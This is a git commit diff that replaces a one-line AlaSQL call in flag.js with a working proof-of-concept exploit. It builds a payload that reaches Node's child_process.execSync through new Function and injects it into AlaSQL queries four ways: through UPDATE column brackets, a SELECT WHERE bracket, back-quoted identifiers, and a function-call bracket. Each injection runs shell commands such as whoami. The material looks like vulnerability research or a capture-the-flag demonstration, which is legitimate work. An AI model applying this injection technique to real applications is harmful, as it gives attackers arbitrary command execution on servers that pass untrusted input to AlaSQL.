94c87f69db72b07c94e462480b51850b2512166b
vr2 <hydw9898@gmail.com>
2024-11-15 10:17:54 +0900

    Update flag.js

--- flag.js
+++ flag.js
@@ -1,1 +1,18 @@
-alasql("CREATE TABLE test3 (a STRING)");
+const genPayload = command => `
+new Function(
+    'return this.process.mainModule.require'
+)()('child_process').execSync(${JSON.stringify(command)})
+`;
+
+
+res = alasql(
+    // Initialize the database
+    'CREATE table i_am_a_table;' +
+    `INSERT INTO i_am_a_table VALUES (1337);` +
+
+    // Code injection in four different ways
+    `UPDATE i_am_a_table SET [0'+${genPayload(">&2 echo UPDATE pwned $(whoami)")}+']=42;` +
+    `SELECT * from i_am_a_table where whatever=['+${genPayload(">&2 echo SELECT pwned $(whoami)")}+'];` +
+    `SELECT \`'+${genPayload(">&2 echo SELECT pwned again, back-quote works too. $(whoami)")}+'\` from i_am_a_table where 1;` +
+    `SELECT [whatever||${genPayload('>&2 echo calling function pwned')}||]('whatever');`
+);
